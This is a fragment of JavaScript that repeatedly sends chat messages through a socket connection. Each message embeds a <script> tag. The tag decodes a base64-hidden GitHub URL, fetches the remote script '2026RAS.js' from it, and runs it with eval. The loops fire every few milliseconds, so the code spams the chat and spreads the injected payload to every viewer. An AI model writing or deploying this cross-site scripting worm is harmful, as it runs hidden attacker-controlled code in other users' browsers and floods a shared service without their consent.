...
setInterval(() => {
    ...
    setInterval(() => {
    socketb.emit("talk", {
        text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'2026RAS'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
    });
    },500)
}, 50)
setInterval(() => {
